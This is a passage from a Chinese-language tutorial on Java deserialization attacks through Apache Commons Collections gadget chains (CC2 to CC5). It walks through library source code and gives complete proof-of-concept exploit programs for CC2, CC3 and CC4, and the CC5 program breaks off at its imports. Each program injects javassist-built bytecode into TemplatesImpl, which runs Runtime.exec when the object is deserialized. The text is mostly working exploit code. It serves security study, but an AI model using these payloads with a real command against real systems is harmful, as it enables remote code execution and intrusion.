                    public Object run() {
                        return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                    }
                });
            try {
                //省略部分代码
                for (int i = 0; i < classCount; i++) {
                    _class[i] = loader.defineClass(_bytecodes[i]); //通过loader将字节码动态构建类到_class中
                    final Class superClass = _class[i].getSuperclass();
                    // Check if this is the main class
                    if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                        _transletIndex = i;
                    }
                    else {
                        _auxClasses.put(_class[i].getName(), _class[i]);
                    }
                }
                //省略部分代码
            }
            //省略部分代码
        }
然后回到`getTransletInstance`中`AbstractTranslet translet = (AbstractTranslet)
_class[_transletIndex].newInstance()`此处对我们恶意字节码中的类进行了实例化，进而触发了RCE。
POC如下：
    package CommonsCollections;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    public class CommonsCollections2 {
        public static void main(String[] args) throws Exception {
            String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
            String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            ClassPool classPool=ClassPool.getDefault();
            classPool.appendClassPath(AbstractTranslet);
            CtClass payload=classPool.makeClass("CommonsCollections22222222222");
            payload.setSuperclass(classPool.get(AbstractTranslet));
            payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
            byte[] bytes=payload.toBytecode();
            Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();
            Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");
            field.setAccessible(true);
            field.set(templatesImpl,new byte[][]{bytes});
            Field field1=templatesImpl.getClass().getDeclaredField("_name");
            field1.setAccessible(true);
            field1.set(templatesImpl,"test");
            InvokerTransformer transformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
            TransformingComparator comparator=new TransformingComparator(transformer);
            PriorityQueue queue = new PriorityQueue(2);
            queue.add(1);
            queue.add(1);
            Field field2=queue.getClass().getDeclaredField("comparator");
            field2.setAccessible(true);
            field2.set(queue,comparator);
            Field field3=queue.getClass().getDeclaredField("queue");
            field3.setAccessible(true);
            field3.set(queue,new Object[]{templatesImpl,templatesImpl});
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
            outputStream.writeObject(queue);
            outputStream.close();
            ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
            inputStream.readObject();
        }
    }
## CommonsCollections3
`Commons Collections3`算是`Commons Collections1`和`Commons
Collections2`两个攻击链的结合吧，理解了1和2这个应该不难理解
2中是通过`InvokerTransformer`去触发`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`的`newTransformer`方法，而3是通过`InstantiateTransformer`实例化`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`触发构造方法进而触发`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`的`newTransformer`方法
跟进`InstantiateTransformer`的`transform`方法，可以看到`con.newInstance(this.iArgs)`，对`con`进行了一个实例化，也就是此处会对`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`进行一个实例化
    public Object transform(Object input) {
        try {
            if (!(input instanceof Class)) {
                throw new FunctorException("InstantiateTransformer: Input object was not an instanceof Class, it was a " + (input == null ? "null object" : input.getClass().getName()));
            } else {
                Constructor con = ((Class)input).getConstructor(this.iParamTypes);
                return con.newInstance(this.iArgs);
            }
        } catch (NoSuchMethodException var6) {
            throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");
        } catch (InstantiationException var7) {
            throw new FunctorException("InstantiateTransformer: InstantiationException", var7);
        } catch (IllegalAccessException var8) {
            throw new FunctorException("InstantiateTransformer: Constructor must be public", var8);
        } catch (InvocationTargetException var9) {
            throw new FunctorException("InstantiateTransformer: Constructor threw an exception", var9);
        }
    }
跟进`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`构造方法，可以看到此处`_transformer
= (TransformerImpl)
templates.newTransformer()`触发了`TransformerImpl`的`newTransformer`方法，
    public TrAXFilter(Templates templates)  throws
        TransformerConfigurationException
    {
        _templates = templates;
        _transformer = (TransformerImpl) templates.newTransformer();
        _transformerHandler = new TransformerHandlerImpl(_transformer);
        _useServicesMechanism = _transformer.useServicesMechnism();
    }
然后触发`InstantiateTransformer`的`transform`方法和1一样也是通过动态代理的，这里就不多赘述了
POC如下：
    package CommonsCollections;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InstantiateTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import javax.xml.transform.Templates;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.util.HashMap;
    import java.util.Map;
    public class CommonsCollections3 {
        public static void main(String[] args) throws Exception {
            String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
            String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            ClassPool classPool=ClassPool.getDefault();
            classPool.appendClassPath(AbstractTranslet);
            CtClass payload=classPool.makeClass("CommonsCollections22222222222");
            payload.setSuperclass(classPool.get(AbstractTranslet));
            payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
            byte[] bytes=payload.toBytecode();
            Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();
            Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");
            field.setAccessible(true);
            field.set(templatesImpl,new byte[][]{bytes});
            Field field1=templatesImpl.getClass().getDeclaredField("_name");
            field1.setAccessible(true);
            field1.set(templatesImpl,"test");
            InstantiateTransformer instantiateTransformer=new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl});
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(TrAXFilter.class),
                    instantiateTransformer
            };
            ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
            Map map=new HashMap();
            Map lazyMap=LazyMap.decorate(map,chainedTransformer);
            Class cls=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor=cls.getDeclaredConstructor(Class.class,Map.class);
            constructor.setAccessible(true);
            InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Override.class,lazyMap);
            Map map1=(Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler);
            Object object=constructor.newInstance(Override.class,map1);
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
            outputStream.writeObject(object);
            outputStream.close();
            ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
            inputStream.readObject();
        }
    }
## CommonsCollections4
利用链和2一样，只不过是把 `InvokerTransformer`换成了`InstantiateTransformer`
    package CommonsCollections;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.InstantiateTransformer;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.Transformer;
    import javax.xml.transform.Templates;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    public class CommonsCollections4 {
        public static void main(String[] args) throws Exception {
            String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
            String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            ClassPool classPool=ClassPool.getDefault();
            classPool.appendClassPath(AbstractTranslet);
            CtClass payload=classPool.makeClass("CommonsCollections22222222222");
            payload.setSuperclass(classPool.get(AbstractTranslet));
            payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
            byte[] bytes=payload.toBytecode();
            Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();
            Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");
            field.setAccessible(true);
            field.set(templatesImpl,new byte[][]{bytes});
            Field field1=templatesImpl.getClass().getDeclaredField("_name");
            field1.setAccessible(true);
            field1.set(templatesImpl,"test");
            InstantiateTransformer instantiateTransformer=new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl});
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(TrAXFilter.class),
                    instantiateTransformer
            };
            ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
            TransformingComparator comparator=new TransformingComparator(chainedTransformer);
            PriorityQueue queue = new PriorityQueue(2);
            queue.add(1);
            queue.add(1);
            Field field2=queue.getClass().getDeclaredField("comparator");
            field2.setAccessible(true);
            field2.set(queue,comparator);
            Field field3=queue.getClass().getDeclaredField("queue");
            field3.setAccessible(true);
            field3.set(queue,new Object[]{templatesImpl,templatesImpl});
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
            outputStream.writeObject(queue);
            outputStream.close();
            ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
            inputStream.readObject();
        }
    }
## CommonsCollections5
`ysoserial`中给出的调用栈如下：
    Gadget chain:
        ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject()
                Map(Proxy).entrySet()
                    AnnotationInvocationHandler.invoke()
                        LazyMap.get()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Class.getMethod()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.getRuntime()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.exec()
跟进`javax.management.BadAttributeValueExpException#readObject`，此处`Object valObj
= gf.get("val",
null);`之后，`valObj`就是我们传入`org.apache.commons.collections.keyvalue.TiedMapEntry`的实例，不过需要`System.getSecurityManager()
== null`，幸运的是，默认情况下，`SecurityManager`是关闭的。
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);
        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
此处是`org.apache.commons.collections.keyvalue.TiedMapEntry#toString`到`org.apache.commons.collections.keyvalue.TiedMapEntry#getValue`，然后又是`LazyMap.get`
    private final Map map;
    public Object getValue() {
        return this.map.get(this.key);
    }
    public String toString() {
        return this.getKey() + "=" + this.getValue();
    }
之后又是一样的操作了，最终POC如下：
    package CommonsCollections;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import javax.management.BadAttributeValueExpException;
    import java.io.*;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;